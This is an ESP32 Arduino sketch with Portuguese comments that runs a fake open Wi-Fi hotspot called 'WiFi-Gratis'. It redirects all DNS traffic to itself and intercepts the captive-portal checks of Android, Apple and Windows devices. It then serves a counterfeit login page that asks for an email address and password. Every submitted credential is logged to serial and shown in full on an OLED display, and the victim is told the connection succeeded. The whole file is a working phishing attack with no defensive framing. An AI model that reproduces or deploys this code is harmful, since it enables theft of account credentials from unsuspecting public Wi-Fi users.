#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
const char* ssid = "WiFi-Gratis";
const char* password = ""; // Senha do AP falso

String capturedEmail = "Nenhum email capturado";
String capturedPassword = "Nenhuma senha capturada";
int attemptCount = 0;

void setup() {
  Serial.begin(115200);
  
  // Inicializar display OLED
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("Falha no display SSD1306"));
    for(;;);
  }
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("Iniciando AP...");
  display.display();
  delay(2000);

  // Criar Access Point
  WiFi.softAP(ssid, password);
  Serial.println("Access Point criado");
  Serial.print("IP: ");
  Serial.println(WiFi.softAPIP());

  // Iniciar servidor DNS para redirecionar todas as requisições
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Configurar rotas do servidor para captive portal
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.on("/generate_204", handleRoot);  // Para Android captive portal
  server.on("/fwlink", handleRoot);        // Para Microsoft captive portal
  server.on("/hotspot-detect.html", handleRoot); // Para Apple captive portal
  server.on("/connecttest.txt", handleRoot); // Para Windows
  server.on("/success.txt", handleRoot); // Para Apple
  server.on("/ncsi.txt", handleRoot); // Para Windows
  server.onNotFound(handleNotFound); // Usar handleNotFound para outras requisições

  server.begin();
  Serial.println("Servidor HTTP e DNS iniciados");

  updateDisplay();
}

void loop() {
  dnsServer.processNextRequest(); // Processar requisições DNS
  server.handleClient(); // Processar requisições HTTP
}

void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;}";
  html += ".container{background:rgba(255,255,255,0.9);padding:30px;border-radius:15px;box-shadow:0 10px 25px rgba(0,0,0,0.2);width:90%;max-width:400px;}";
  html += "h2{text-align:center;color:#333;margin-bottom:20px;}";
  html += "p{text-align:center;color:#666;margin-bottom:25px;}";
  html += "input{padding:12px;margin:10px 0;width:100%;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:16px;}";
  html += "button{background:#007bff;color:white;padding:12px 20px;border:none;border-radius:8px;cursor:pointer;width:100%;font-size:16px;margin-top:10px;}";
  html += "button:hover{background:#0056b3;}";
  html += ".logo{text-align:center;font-size:24px;margin-bottom:20px;color:#007bff;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='logo'></div>";
  html += "<h2>Login Necessario</h2>";
  html += "<p>Por favor, faca login para acessar a internet</p>";
  html += "<form action='/login' method='post'>";
  html += "<input type='email' name='email' placeholder='Seu endereco de email' required>";
  html += "<input type='password' name='password' placeholder='Sua senha' required>";
  html += "<button type='submit'>Conectar a Internet</button>";
  html += "</form>";
  html += "<p style='font-size:12px;margin-top:20px;'>Ao conectar, voce concorda com nossos Termos de Servico</p>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

void handleLogin() {
  if (server.method() == HTTP_POST) {
    if (server.hasArg("email") && server.hasArg("password")) {
      capturedEmail = server.arg("email");
      capturedPassword = server.arg("password");
      attemptCount++;
      
      Serial.print("Email capturado: ");
      Serial.println(capturedEmail);
      Serial.print("Senha capturada: ");
      Serial.println(capturedPassword);
      Serial.print("Tentativas: ");
      Serial.println(attemptCount);
      
      updateDisplay();
    }
  }
  
  // Página de sucesso com redirecionamento
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta http-equiv='refresh' content='5;url=/'>";
  html += "<style>body{font-family:Arial,sans-serif;text-align:center;background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;}</style></head><body>";
  html += "<div style='background:white;padding:30px;border-radius:15px;box-shadow:0 10px 25px rgba(0,0,0,0.2);'>";
  html += "<h2 style='color:#4CAF50;'> Conexao Bem-Sucedida!</h2>";
  html += "<p>Voce agora esta conectado a internet.</p>";
  html += "<p>Redirecionando em 5 segundos...</p>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

void handleNotFound() {
  // Para outras requisições, redirecionar para a página principal
  server.sendHeader("Location", "http://192.168.4.1/");
  server.send(302, "text/plain", "Redirecting...");
}

void updateDisplay() {
  display.clearDisplay();
  display.setCursor(0,0);
  
  display.println("AP: WiFi-Gratis");
  display.println("IP: 192.168.4.1");
  display.println("---------------");
  display.print("Tentativas: ");
  display.println(attemptCount);
  
  if (capturedEmail != "Nenhum email capturado") {
    display.println("Email:");
    
    // Mostrar email completo sem mascaramento
    // Se o email for muito longo, quebra em duas linhas
    if (capturedEmail.length() > 16) {
      display.println(capturedEmail.substring(0, 16));
      display.println(capturedEmail.substring(16));
    } else {
      display.println(capturedEmail);
    }
  }
  
  if (capturedPassword != "Nenhuma senha capturada") {
    display.println("Senha:");
    
    // Mostrar senha completa sem mascaramento
    // Se a senha for muito longa, quebra em duas linhas
    if (capturedPassword.length() > 16) {
      display.println(capturedPassword.substring(0, 16));
      display.println(capturedPassword.substring(16));
    } else {
      display.println(capturedPassword);
    }
  }
  
  display.display();
  delay(1000);
}
